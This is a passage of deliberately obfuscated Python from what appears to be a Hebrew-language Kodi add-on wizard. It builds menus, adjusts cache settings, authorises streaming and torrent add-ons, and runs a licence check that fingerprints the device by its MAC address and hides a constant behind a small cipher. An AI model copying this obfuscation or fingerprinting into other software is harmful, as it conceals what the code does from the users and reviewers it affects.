			OOOO00O0OOOOOO00O =[]#line:1700
			for OO0O00OO00O000000 in O00OOO000OO00O0OO :#line:1701
				OO00OO000000OO000 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO0O00OO00O000000 )#line:1702
				if len (OO00OO000000OO000 )==0 :#line:1703
					OO00OO000000OO000 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO0O00OO00O000000 )#line:1704
				for OO0OOOOO00OOO0O00 in OO00OO000000OO000 :#line:1705
					OOOO0OOO0O00OOO0O =OO0OOOOO00OOO0O00 [0 ]#line:1706
					if OOOO0OOO0O00OOO0O in "'\"":#line:1707
						if OO0OOOOO00OOO0O00 .find ('='+OOOO0OOO0O00OOO0O ,OO0OOOOO00OOO0O00 .find (OOOO0OOO0O00OOO0O ,1 ))>-1 :#line:1708
							OO0OOOOO00OOO0O00 =OO0OOOOO00OOO0O00 [:OO0OOOOO00OOO0O00 .find ('='+OOOO0OOO0O00OOO0O ,OO0OOOOO00OOO0O00 .find (OOOO0OOO0O00OOO0O ,1 ))]#line:1709
						if OO0OOOOO00OOO0O00 .rfind (OOOO0OOO0O00OOO0O ,1 )>-1 :#line:1711
							OO0OOOOO00OOO0O00 =OO0OOOOO00OOO0O00 [1 :OO0OOOOO00OOO0O00 .rfind (OOOO0OOO0O00OOO0O )]#line:1712
					else :#line:1713
						if OO0OOOOO00OOO0O00 .find (" ")>0 :#line:1714
							OO0OOOOO00OOO0O00 =OO0OOOOO00OOO0O00 [:OO0OOOOO00OOO0O00 .find (" ")]#line:1715
						elif OO0OOOOO00OOO0O00 .find ("/")>0 :#line:1716
							OO0OOOOO00OOO0O00 =OO0OOOOO00OOO0O00 [:OO0OOOOO00OOO0O00 .find ("/")]#line:1717
						elif OO0OOOOO00OOO0O00 .find (">")>0 :#line:1718
							OO0OOOOO00OOO0O00 =OO0OOOOO00OOO0O00 [:OO0OOOOO00OOO0O00 .find (">")]#line:1719
					OOOO00O0OOOOOO00O .append (OO0OOOOO00OOO0O00 .strip ())#line:1721
			O00OOO000OO00O0OO =OOOO00O0OOOOOO00O #line:1722
		else :#line:1723
			OOOO00O0OOOOOO00O =[]#line:1724
			for OO0O00OO00O000000 in O00OOO000OO00O0OO :#line:1725
				O00OO0OOOOO0O0OOO =u"</"+name #line:1726
				OOOO0O00O00OO00O0 =O00O0000000O00O00 .find (OO0O00OO00O000000 )#line:1728
				O0OOOOO0O0OO00OO0 =O00O0000000O00O00 .find (O00OO0OOOOO0O0OOO ,OOOO0O00O00OO00O0 )#line:1729
				OO0000OO0000O000O =O00O0000000O00O00 .find ("<"+name ,OOOO0O00O00OO00O0 +1 )#line:1730
				while OO0000OO0000O000O <O0OOOOO0O0OO00OO0 and OO0000OO0000O000O !=-1 :#line:1732
					O0OO0000O00O0O00O =O00O0000000O00O00 .find (O00OO0OOOOO0O0OOO ,O0OOOOO0O0OO00OO0 +len (O00OO0OOOOO0O0OOO ))#line:1733
					if O0OO0000O00O0O00O !=-1 :#line:1734
						O0OOOOO0O0OO00OO0 =O0OO0000O00O0O00O #line:1735
					OO0000OO0000O000O =O00O0000000O00O00 .find ("<"+name ,OO0000OO0000O000O +1 )#line:1736
				if OOOO0O00O00OO00O0 ==-1 and O0OOOOO0O0OO00OO0 ==-1 :#line:1738
					O00000OOO000O000O =u""#line:1739
				elif OOOO0O00O00OO00O0 >-1 and O0OOOOO0O0OO00OO0 >-1 :#line:1740
					O00000OOO000O000O =O00O0000000O00O00 [OOOO0O00O00OO00O0 +len (OO0O00OO00O000000 ):O0OOOOO0O0OO00OO0 ]#line:1741
				elif O0OOOOO0O0OO00OO0 >-1 :#line:1742
					O00000OOO000O000O =O00O0000000O00O00 [:O0OOOOO0O0OO00OO0 ]#line:1743
				elif OOOO0O00O00OO00O0 >-1 :#line:1744
					O00000OOO000O000O =O00O0000000O00O00 [OOOO0O00O00OO00O0 +len (OO0O00OO00O000000 ):]#line:1745
				if ret :#line:1747
					O00OO0OOOOO0O0OOO =O00O0000000O00O00 [O0OOOOO0O0OO00OO0 :O00O0000000O00O00 .find (">",O00O0000000O00O00 .find (O00OO0OOOOO0O0OOO ))+1 ]#line:1748
					O00000OOO000O000O =OO0O00OO00O000000 +O00000OOO000O000O +O00OO0OOOOO0O0OOO #line:1749
				O00O0000000O00O00 =O00O0000000O00O00 [O00O0000000O00O00 .find (O00000OOO000O000O ,O00O0000000O00O00 .find (OO0O00OO00O000000 ))+len (O00000OOO000O000O ):]#line:1751
				OOOO00O0OOOOOO00O .append (O00000OOO000O000O )#line:1752
			O00OOO000OO00O0OO =OOOO00O0OOOOOO00O #line:1753
		O0OOOOOOOO00000OO +=O00OOO000OO00O0OO #line:1754
	return O0OOOOOOOO00000OO #line:1756
def addItem (OO000OOO0OOOO0OOO ,OOOO0000000O0O0O0 ,O0O0OO00O00O0000O ,OO000OOO00OOO0OO0 ,OO0OO00000OOOOOO0 ,description =None ):#line:1758
	if description ==None :description =''#line:1759
	description ='[COLOR white]'+description +'[/COLOR]'#line:1760
	OO0OO0O00000OO000 =sys .argv [0 ]+"?url="+urllib .quote_plus (OOOO0000000O0O0O0 )+"&mode="+str (O0O0OO00O00O0000O )+"&name="+urllib .quote_plus (OO000OOO0OOOO0OOO )+"&iconimage="+urllib .quote_plus (OO000OOO00OOO0OO0 )+"&fanart="+urllib .quote_plus (OO0OO00000OOOOOO0 )#line:1761
	O00000OO0O000O0OO =True #line:1762
	OO00OOOO00OO00O0O =xbmcgui .ListItem (OO000OOO0OOOO0OOO ,iconImage =OO000OOO00OOO0OO0 ,thumbnailImage =OO000OOO00OOO0OO0 )#line:1763
	OO00OOOO00OO00O0O .setInfo (type ="Video",infoLabels ={"Title":OO000OOO0OOOO0OOO ,"Plot":description })#line:1764
	OO00OOOO00OO00O0O .setProperty ("fanart_Image",OO0OO00000OOOOOO0 )#line:1765
	OO00OOOO00OO00O0O .setProperty ("icon_Image",OO000OOO00OOO0OO0 )#line:1766
	O00000OO0O000O0OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0OO0O00000OO000 ,listitem =OO00OOOO00OO00O0O ,isFolder =False )#line:1767
	return O00000OO0O000O0OO #line:1768
def get_params ():#line:1770
		OO0OOOOO0OO0OO000 =[]#line:1771
		O000O0000O00OOO00 =sys .argv [2 ]#line:1772
		if len (O000O0000O00OOO00 )>=2 :#line:1773
				OOO00O0O00O0OOO00 =sys .argv [2 ]#line:1774
				O0O000OO00OO0OO00 =OOO00O0O00O0OOO00 .replace ('?','')#line:1775
				if (OOO00O0O00O0OOO00 [len (OOO00O0O00O0OOO00 )-1 ]=='/'):#line:1776
						OOO00O0O00O0OOO00 =OOO00O0O00O0OOO00 [0 :len (OOO00O0O00O0OOO00 )-2 ]#line:1777
				O0O0O00OOO00O0000 =O0O000OO00OO0OO00 .split ('&')#line:1778
				OO0OOOOO0OO0OO000 ={}#line:1779
				for OO0OOO000000O0OOO in range (len (O0O0O00OOO00O0000 )):#line:1780
						OOOOOO0OO00O0OO0O ={}#line:1781
						OOOOOO0OO00O0OO0O =O0O0O00OOO00O0000 [OO0OOO000000O0OOO ].split ('=')#line:1782
						if (len (OOOOOO0OO00O0OO0O ))==2 :#line:1783
								OO0OOOOO0OO0OO000 [OOOOOO0OO00O0OO0O [0 ]]=OOOOOO0OO00O0OO0O [1 ]#line:1784
		return OO0OOOOO0OO0OO000 #line:1786
def decode (OOOO000OOOOO0OOOO ,O0O0OO0O0O00O00O0 ):#line:1791
    import base64 #line:1792
    OO0000000OOOO0OO0 =[]#line:1793
    if (len (OOOO000OOOOO0OOOO ))!=4 :#line:1795
     return 10 #line:1796
    O0O0OO0O0O00O00O0 =base64 .urlsafe_b64decode (O0O0OO0O0O00O00O0 )#line:1797
    for OOO0OO00OO0000OO0 in range (len (O0O0OO0O0O00O00O0 )):#line:1799
        OO0OOO00OO00OOOOO =OOOO000OOOOO0OOOO [OOO0OO00OO0000OO0 %len (OOOO000OOOOO0OOOO )]#line:1800
        O0000O0OO00O000OO =chr ((256 +ord (O0O0OO0O0O00O00O0 [OOO0OO00OO0000OO0 ])-ord (OO0OOO00OO00OOOOO ))%256 )#line:1801
        OO0000000OOOO0OO0 .append (O0000O0OO00O000OO )#line:1802
    return "".join (OO0000000OOOO0OO0 )#line:1803
def tmdb_list (O00O00O00000O0O0O ):#line:1804
    O0OO000O0O000OOOO =decode ("7643",O00O00O00000O0O0O )#line:1807
    return int (O0OO000O0O000OOOO )#line:1810
def u_list (O00O0OO000000O0OO ):#line:1811
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1813
        from math import sqrt #line:1814
        OO0O0O0000OO0O00O =tmdb_list (TMDB_NEW_API )#line:1815
        OOOOO0OO000000O0O =str ((getHwAddr ('eth0'))*OO0O0O0000OO0O00O )#line:1817
        O0OO000O00OOO00O0 =int (OOOOO0OO000000O0O [1 ]+OOOOO0OO000000O0O [2 ]+OOOOO0OO000000O0O [5 ]+OOOOO0OO000000O0O [7 ])#line:1818
        OOO00O00O0O000O0O =(ADDON .getSetting ("pass"))#line:1820
        O0O0O0OOOOOOOO0OO =(str (round (sqrt ((O0OO000O00OOO00O0 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1825
        if '.'in O0O0O0OOOOOOOO0OO :#line:1827
         O0O0O0OOOOOOOO0OO =(str (round (sqrt ((O0OO000O00OOO00O0 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1828
        if OOO00O00O0O000O0O ==O0O0O0OOOOOOOO0OO :#line:1830
          OO00O0000O00O0O00 =O00O0OO000000O0OO #line:1832
        else :#line:1834
           if STARTP2 ()and STARTP ()=='ok':#line:1835
             return O00O0OO000000O0OO #line:1838
           OO00O0000O00O0O00 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1839
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1840
           sys .exit ()#line:1841
        return OO00O0000O00O0O00 #line:1842
    else :#line:1843
        STARTP ()#line:1844
def disply_hwr ():#line:1848
   try :#line:1849
    OOO0OOOO0OO00OOOO =tmdb_list (TMDB_NEW_API )#line:1850
    OO0O0OOO0OO0O0OO0 =str ((getHwAddr ('eth0'))*OOO0OOOO0OO00OOOO )#line:1851
    OOOOO000000O00O0O =(OO0O0OOO0OO0O0OO0 [1 ]+OO0O0OOO0OO0O0OO0 [2 ]+OO0O0OOO0OO0O0OO0 [5 ]+OO0O0OOO0OO0O0OO0 [7 ])#line:1858
    O00O0OOO00OOOOOOO =(ADDON .getSetting ("action"))#line:1859
    wiz .setS ('action',str (OOOOO000000O00O0O ))#line:1861
   except :pass #line:1862
def disply_hwr2 ():#line:1863
   try :#line:1864
    O00O0O00OOO00OO0O =tmdb_list (TMDB_NEW_API )#line:1865
    OO0OO0O0000OO0O00 =str ((getHwAddr ('eth0'))*O00O0O00OOO00OO0O )#line:1867
    OO000OO0O0000O000 =(OO0OO0O0000OO0O00 [1 ]+OO0OO0O0000OO0O00 [2 ]+OO0OO0O0000OO0O00 [5 ]+OO0OO0O0000OO0O00 [7 ])#line:1876
    OO0O0O00O0OO00000 =(ADDON .getSetting ("action"))#line:1877
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OO000OO0O0000O000 )#line:1880
   except :pass #line:1881
def getHwAddr (OOO00000O00O0000O ):#line:1883
   import subprocess ,time #line:1884
   OOOO0O0OO0OOO00OO ='windows'#line:1885
   if xbmc .getCondVisibility ('system.platform.android'):#line:1886
       OOOO0O0OO0OOO00OO ='android'#line:1887
   if xbmc .getCondVisibility ('system.platform.android'):#line:1888
     O00O00OOO000O00OO =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1889
     O0O0O0OO00O0O0OOO =re .compile ('link/ether (.+?) brd').findall (str (O00O00OOO000O00OO ))#line:1891
     O0O0OO0O0OO00OO0O =0 #line:1892
     for OO00OO00O000O0OO0 in O0O0O0OO00O0O0OOO :#line:1893
      if O0O0O0OO00O0O0OOO !='00:00:00:00:00:00':#line:1894
          OOOOOOOOOO00000O0 =OO00OO00O000O0OO0 #line:1895
          O0O0OO0O0OO00OO0O =O0O0OO0O0OO00OO0O +int (OOOOOOOOOO00000O0 .replace (':',''),16 )#line:1896
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1898
       O00OOO00000000OOO =0 #line:1899
       O0O0OO0O0OO00OO0O =0 #line:1900
       OO00OO000O00O0O0O =[]#line:1901
       OO00O0000O0OO000O =os .popen ("getmac").read ()#line:1902
       OO00O0000O0OO000O =OO00O0000O0OO000O .split ("\n")#line:1903
       for OO0OO000O00OOOOOO in OO00O0000O0OO000O :#line:1905
            OO0000O000O0O00O0 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OO0OO000O00OOOOOO ,re .I )#line:1906
            if OO0000O000O0O00O0 :#line:1907
                O0O0O0OO00O0O0OOO =OO0000O000O0O00O0 .group ().replace ('-',':')#line:1908
                OO00OO000O00O0O0O .append (O0O0O0OO00O0O0OOO )#line:1909
                O0O0OO0O0OO00OO0O =O0O0OO0O0OO00OO0O +int (O0O0O0OO00O0O0OOO .replace (':',''),16 )#line:1912
   else :#line:1914
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1915
   try :#line:1932
    return O0O0OO0O0OO00OO0O #line:1933
   except :pass #line:1934
def getpass ():#line:1935
	disply_hwr2 ()#line:1937
def setpass ():#line:1938
    O000OOOO00000OO0O =xbmcgui .Dialog ()#line:1939
    O00OO0OO0OOO0OOOO =''#line:1940
    OO00O00O0OOO00000 =xbmc .Keyboard (O00OO0OO0OOO0OOOO ,'הכנס סיסמה')#line:1942
    OO00O00O0OOO00000 .doModal ()#line:1943
    if OO00O00O0OOO00000 .isConfirmed ():#line:1944
           OO00O00O0OOO00000 =OO00O00O0OOO00000 .getText ()#line:1945
    wiz .setS ('pass',str (OO00O00O0OOO00000 ))#line:1946
def setuname ():#line:1947
    O00OOO0O00OO0OO00 =''#line:1948
    O000OOO0000OO00O0 =xbmc .Keyboard (O00OOO0O00OO0OO00 ,'הכנס שם משתמש')#line:1949
    O000OOO0000OO00O0 .doModal ()#line:1950
    if O000OOO0000OO00O0 .isConfirmed ():#line:1951
           O00OOO0O00OO0OO00 =O000OOO0000OO00O0 .getText ()#line:1952
           wiz .setS ('user',str (O00OOO0O00OO0OO00 ))#line:1953
def powerkodi ():#line:1954
    os ._exit (1 )#line:1955
def buffer1 ():#line:1957
	OOO0O00OO0OOOOO00 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1958
	OOOOO000OOO0OOOO0 =xbmc .getInfoLabel ("System.Memory(total)")#line:1959
	O0OOOO0OO0O0OOOO0 =xbmc .getInfoLabel ("System.FreeMemory")#line:1960
	OOOO0O000OO00O000 =re .sub ('[^0-9]','',O0OOOO0OO0O0OOOO0 )#line:1961
	OOOO0O000OO00O000 =int (OOOO0O000OO00O000 )/3 #line:1962
	OO0O0OO0OO000O000 =OOOO0O000OO00O000 *1024 *1024 #line:1963
	try :O000OO0OOOOO0O0OO =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1964
	except :O000OO0OOOOO0O0OO =16 #line:1965
	O0OOO0OOO0O000000 =DIALOG .yesno ('FREE MEMORY: '+str (O0OOOO0OO0O0OOOO0 ),'Based on your free Memory your optimal buffersize is: '+str (OOOO0O000OO00O000 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1968
	if O0OOO0OOO0O000000 ==1 :#line:1969
		with open (OOO0O00OO0OOOOO00 ,"w")as OO0000O0O000OOOOO :#line:1970
			if O000OO0OOOOO0O0OO >=17 :O0OOO0OOOOOOO00OO =xml_data_advSettings_New (str (OO0O0OO0OO000O000 ))#line:1971
			else :O0OOO0OOOOOOO00OO =xml_data_advSettings_old (str (OO0O0OO0OO000O000 ))#line:1972
			OO0000O0O000OOOOO .write (O0OOO0OOOOOOO00OO )#line:1974
			DIALOG .ok ('Buffer Size Set to: '+str (OO0O0OO0OO000O000 ),'Please restart Kodi for settings to apply.','')#line:1975
	elif O0OOO0OOO0O000000 ==0 :#line:1977
		OO0O0OO0OO000O000 =_O0O0O00OO00OOO00O (default =str (OO0O0OO0OO000O000 ),heading ="INPUT BUFFER SIZE")#line:1978
		with open (OOO0O00OO0OOOOO00 ,"w")as OO0000O0O000OOOOO :#line:1979
			if O000OO0OOOOO0O0OO >=17 :O0OOO0OOOOOOO00OO =xml_data_advSettings_New (str (OO0O0OO0OO000O000 ))#line:1980
			else :O0OOO0OOOOOOO00OO =xml_data_advSettings_old (str (OO0O0OO0OO000O000 ))#line:1981
			OO0000O0O000OOOOO .write (O0OOO0OOOOOOO00OO )#line:1982
			DIALOG .ok ('Buffer Size Set to: '+str (OO0O0OO0OO000O000 ),'Please restart Kodi for settings to apply.','')#line:1983
def xml_data_advSettings_old (OO00O0O00000OOOOO ):#line:1984
	O0O0OO0O000000OOO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO00O0O00000OOOOO #line:1994
	return O0O0OO0O000000OOO #line:1995
def xml_data_advSettings_New (O00O0O0OO000O00OO ):#line:1997
	OO000O00OO000OO0O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O00O0O0OO000O00OO #line:2009
	return OO000O00OO000OO0O #line:2010
def write_ADV_SETTINGS_XML (O0O000OOO0OO0OO00 ):#line:2011
    if not os .path .exists (xml_file ):#line:2012
        with open (xml_file ,"w")as O000O00000OOO0O0O :#line:2013
            O000O00000OOO0O0O .write (xml_data )#line:2014
def _O0O0O00OO00OOO00O (default ="",heading ="",hidden =False ):#line:2015
    ""#line:2016
    OOO0O0O00000OO0OO =xbmc .Keyboard (default ,heading ,hidden )#line:2017
    OOO0O0O00000OO0OO .doModal ()#line:2018
    if (OOO0O0O00000OO0OO .isConfirmed ()):#line:2019
        return unicode (OOO0O0O00000OO0OO .getText (),"utf-8")#line:2020
    return default #line:2021
def index ():#line:2023
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2024
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2025
	if AUTOUPDATE =='Yes':#line:2026
		if wiz .workingURL (WIZARDFILE )==True :#line:2027
			OO0OO00OOOOOO000O =wiz .checkWizard ('version')#line:2028
			if OO0OO00OOOOOO000O >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OO0OO00OOOOOO000O ),'wizardupdate',themeit =THEME2 )#line:2029
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2030
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2031
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2032
	if len (BUILDNAME )>0 :#line:2033
		OO0OO0OO00O0O0O0O =wiz .checkBuild (BUILDNAME ,'version')#line:2034
		OO00000O000OO00O0 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2035
		if OO0OO0OO00O0O0O0O >BUILDVERSION :OO00000O000OO00O0 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(OO00000O000OO00O0 ,OO0OO0OO00O0O0O0O )#line:2036
		addDir (OO00000O000OO00O0 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2038
		try :#line:2040
		     O00O000000OO0O0O0 =wiz .themeCount (BUILDNAME )#line:2041
		except :#line:2042
		   O00O000000OO0O0O0 =False #line:2043
		if not O00O000000OO0O0O0 ==False :#line:2044
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2045
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2046
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2049
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2050
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2051
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2055
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2057
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2059
def morsetup ():#line:2061
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2062
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2063
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2064
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2065
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2066
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2070
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2071
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2074
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2075
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2085
	setView ('files','viewType')#line:2086
def morsetup2 ():#line:2087
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2088
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2089
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2090
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2091
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2092
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2093
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2094
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2095
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2096
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2097
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2098
def fastupdate ():#line:2099
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2100
def forcefastupdate ():#line:2102
			OO0OO00O00OOO0OO0 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2103
			wiz .ForceFastUpDate (ADDONTITLE ,OO0OO00O00OOO0OO0 )#line:2104
def rdsetup ():#line:2108
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2109
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2110
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2112
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2113
def traktsetup ():#line:2116
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2117
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2118
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2119
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2120
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2121
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2122
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2123
	setView ('files','viewType')#line:2124
def setautorealdebrid ():#line:2125
    from resources .libs import real_debrid #line:2126
    OOOOOO000OOOO0O0O =real_debrid .RealDebridFirst ()#line:2127
    OOOOOO000OOOO0O0O .auth ()#line:2128
def setrealdebrid ():#line:2130
    OOO0O0O0OO0000OO0 =(ADDON .getSetting ("auto_rd"))#line:2131
    if OOO0O0O0OO0000OO0 =='false':#line:2132
       ADDON .openSettings ()#line:2133
    else :#line:2134
        from resources .libs import real_debrid #line:2135
        O0O0OOOO00O0OOO00 =real_debrid .RealDebrid ()#line:2136
        O0O0OOOO00O0OOO00 .auth ()#line:2137
        rdon ()#line:2140
def resolveurlsetup ():#line:2142
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2143
def urlresolversetup ():#line:2144
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2145
def placentasetup ():#line:2147
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2148
def reptiliasetup ():#line:2149
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2150
def flixnetsetup ():#line:2151
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2152
def yodasetup ():#line:2153
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2154
def numberssetup ():#line:2155
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2156
def uranussetup ():#line:2157
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2158
def genesissetup ():#line:2159
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2160
def net_tools (view =None ):#line:2162
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2163
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2164
	setView ('files','viewType')#line:2166
def speedMenu ():#line:2167
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2168
def viewIP ():#line:2169
	O00O0OO000O0OOOOO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2183
	O0OOO0000O0OO0O0O =[];O0O0OOO0O00O00000 =0 #line:2184
	for O0O00O0OO0O00OO00 in O00O0OO000O0OOOOO :#line:2185
		O0000O0O0O000OOO0 =wiz .getInfo (O0O00O0OO0O00OO00 )#line:2186
		OO00O0OO0OOOO00O0 =0 #line:2187
		while O0000O0O0O000OOO0 =="Busy"and OO00O0OO0OOOO00O0 <10 :#line:2188
			O0000O0O0O000OOO0 =wiz .getInfo (O0O00O0OO0O00OO00 );OO00O0OO0OOOO00O0 +=1 ;wiz .log ("%s sleep %s"%(O0O00O0OO0O00OO00 ,str (OO00O0OO0OOOO00O0 )));xbmc .sleep (1000 )#line:2189
		O0OOO0000O0OO0O0O .append (O0000O0O0O000OOO0 )#line:2190
		O0O0OOO0O00O00000 +=1 #line:2191
	O0OO000OO00O0OOOO ,OO0O000O0OO0OO0O0 ,OOOO000OOOOO00OOO =getIP ()#line:2192
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0000O0OO0O0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2193
